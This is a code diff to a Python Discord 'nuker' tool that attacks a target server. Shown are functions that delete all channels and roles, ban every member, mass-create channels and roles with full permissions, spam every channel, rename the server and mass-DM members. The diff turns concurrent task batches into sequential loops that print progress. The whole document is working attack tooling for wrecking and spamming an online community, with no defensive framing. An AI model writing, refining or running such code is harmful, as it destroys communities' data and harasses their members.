@@ -169,21 +169,16 @@ async def show_menu():
 
 async def del_chans():
     start = time.time()
-    chs = list(guild_target.channels)
+    chs = guild_target.channels
     cnt["v"] = 0
-    sem = asyncio.Semaphore(10)
     
-    async def delete_channel(channel):
-        async with sem:
-            try:
-                await channel.delete(reason="3zF")
-                with lck:
-                    cnt["v"] += 1
-            except:
-                pass
-    
-    tasks = [delete_channel(ch) for ch in chs]
-    await asyncio.gather(*tasks, return_exceptions=True)
+    for ch in chs:
+        try:
+            await ch.delete()
+            cnt["v"] += 1
+            print(f"{R}[+] {W}DELETED: {ch.name}{X}")
+        except Exception as e:
+            print(f"{R}[-] {W}FAILED: {ch.name} - {e}{X}")
     
     print(f"\n{R}[+] {W}{cnt['v']}{R} CHANNELS DELETED {W}[{time.time()-start:.2f}s]{X}")
     input(f"{R}[>] ENTER{X}")
@@ -192,19 +187,14 @@ async def del_roles():
     start = time.time()
     roles = [r for r in guild_target.roles if r.name != "@everyone"]
     cnt["v"] = 0
-    sem = asyncio.Semaphore(10)
     
-    async def delete_role(role):
-        async with sem:
-            try:
-                await role.delete(reason="3zF")
-                with lck:
-                    cnt["v"] += 1
-            except:
-                pass
-    
-    tasks = [delete_role(r) for r in roles]
-    await asyncio.gather(*tasks, return_exceptions=True)
+    for r in roles:
+        try:
+            await r.delete()
+            cnt["v"] += 1
+            print(f"{R}[+] {W}DELETED: {r.name}{X}")
+        except Exception as e:
+            print(f"{R}[-] {W}FAILED: {r.name} - {e}{X}")
     
     print(f"\n{R}[+] {W}{cnt['v']}{R} ROLES DELETED {W}[{time.time()-start:.2f}s]{X}")
     input(f"{R}[>] ENTER{X}")
@@ -221,19 +211,14 @@ async def ban_all():
     await guild_target.fetch_members()
     members = [m for m in guild_target.members if m.id != client.user.id]
     cnt["v"] = 0
-    sem = asyncio.Semaphore(5)
     
-    async def ban_member(member):
-        async with sem:
-            try:
-                await member.ban(reason="3zF")
-                with lck:
-                    cnt["v"] += 1
-            except:
-                pass
-    
-    tasks = [ban_member(m) for m in members]
-    await asyncio.gather(*tasks, return_exceptions=True)
+    for m in members:
+        try:
+            await m.ban(reason="3zF")
+            cnt["v"] += 1
+            print(f"{R}[+] {W}BANNED: {m.name}{X}")
+        except Exception as e:
+            print(f"{R}[-] {W}FAILED: {m.name} - {e}{X}")
     
     print(f"\n{R}[+] {W}{cnt['v']}{R} MEMBERS BANNED {W}[{time.time()-start:.2f}s]{X}")
     input(f"{R}[>] ENTER{X}")
@@ -250,23 +235,18 @@ async def create_chans(n):
             pass
     
     cnt["v"] = 0
-    sem = asyncio.Semaphore(5)
     
-    async def create_channel(i):
-        async with sem:
-            try:
-                name = chan_list[i % len(chan_list)]
-                if cat:
-                    await guild_target.create_text_channel(name, category=cat)
-                else:
-                    await guild_target.create_text_channel(name)
-                with lck:
-                    cnt["v"] += 1
-            except:
-                pass
-    
-    tasks = [create_channel(i) for i in range(n)]
-    await asyncio.gather(*tasks, return_exceptions=True)
+    for i in range(n):
+        try:
+            name = chan_list[i % len(chan_list)]
+            if cat:
+                await guild_target.create_text_channel(name, category=cat)
+            else:
+                await guild_target.create_text_channel(name)
+            cnt["v"] += 1
+            print(f"{R}[+] {W}CREATED: {name}{X}")
+        except Exception as e:
+            print(f"{R}[-] {W}FAILED: {name} - {e}{X}")
     
     print(f"\n{R}[+] {W}{cnt['v']}{R} CHANNELS CREATED {W}[{time.time()-start:.2f}s]{X}")
     input(f"{R}[>] ENTER{X}")
@@ -284,24 +264,19 @@ async def create_roles(n):
             color = 0xFF0000
     
     cnt["v"] = 0
-    sem = asyncio.Semaphore(5)
     
-    async def create_role(i):
-        async with sem:
-            try:
-                name = role_list[i % len(role_list)]
-                await guild_target.create_role(
-                    name=name,
-                    color=discord.Color(color),
-                    permissions=discord.Permissions.all()
-                )
-                with lck:
-                    cnt["v"] += 1
-            except:
-                pass
-    
-    tasks = [create_role(i) for i in range(n)]
-    await asyncio.gather(*tasks, return_exceptions=True)
+    for i in range(n):
+        try:
+            name = role_list[i % len(role_list)]
+            await guild_target.create_role(
+                name=name,
+                color=discord.Color(color),
+                permissions=discord.Permissions.all()
+            )
+            cnt["v"] += 1
+            print(f"{R}[+] {W}CREATED: {name}{X}")
+        except Exception as e:
+            print(f"{R}[-] {W}FAILED: {name} - {e}{X}")
     
     print(f"\n{R}[+] {W}{cnt['v']}{R} ROLES CREATED {W}[{time.time()-start:.2f}s]{X}")
     input(f"{R}[>] ENTER{X}")
@@ -318,21 +293,15 @@ async def spam_all():
     
     chs = [c for c in guild_target.text_channels]
     cnt["v"] = 0
-    sem = asyncio.Semaphore(10)
     
-    async def spam_channel(channel):
-        async with sem:
-            try:
-                for i in range(per):
-                    await channel.send(msg)
-                    await asyncio.sleep(0.5)
-                    with lck:
-                        cnt["v"] += 1
-            except:
-                pass
-    
-    tasks = [spam_channel(ch) for ch in chs]
-    await asyncio.gather(*tasks, return_exceptions=True)
+    for ch in chs:
+        try:
+            for i in range(per):
+                await ch.send(msg)
+                cnt["v"] += 1
+                print(f"{R}[+] {W}SENT: {ch.name} [{i+1}/{per}]{X}")
+        except Exception as e:
+            print(f"{R}[-] {W}FAILED: {ch.name} - {e}{X}")
     
     print(f"\n{R}[+] {W}{cnt['v']}{R} MESSAGES SENT {W}[{time.time()-start:.2f}s]{X}")
     input(f"{R}[>] ENTER{X}")
@@ -341,9 +310,9 @@ async def change_name():
     name = input(f"{R}[>] NEW NAME : {W}")
     try:
         await guild_target.edit(name=name)
-        print(f"{R}[+] NAME : {W}{name}{X}")
-    except:
-        print(f"{R}[-] FAILED{X}")
+        print(f"{R}[+] NAME CHANGED TO: {W}{name}{X}")
+    except Exception as e:
+        print(f"{R}[-] FAILED: {e}{X}")
     
     input(f"{R}[>] ENTER{X}")
 
@@ -354,20 +323,15 @@ async def dm_all():
     await guild_target.fetch_members()
     members = [m for m in guild_target.members if m.id != client.user.id]
     cnt["v"] = 0
-    sem = asyncio.Semaphore(5)
     
-    async def dm_member(member):
-        async with sem:
-            try:
-                await member.send(msg)
-                with lck:
-                    cnt["v"] += 1
-                await asyncio.sleep(0.5)
-            except:
-                pass
-    
-    tasks = [dm_member(m) for m in members]
-    await asyncio.gather(*tasks, return_exceptions=True)
+    for m in members:
+        try:
+            await m.send(msg)
+            cnt["v"] += 1
+            print(f"{R}[+] {W}DM SENT: {m.name}{X}")
+            await asyncio.sleep(0.3)
+        except Exception as e:
+            print(f"{R}[-] {W}FAILED: {m.name} - {e}{X}")
     
     print(f"\n{R}[+] {W}{cnt['v']}{R} DMS SENT {W}[{time.time()-start:.2f}s]{X}")
     input(f"{R}[>] ENTER{X}")
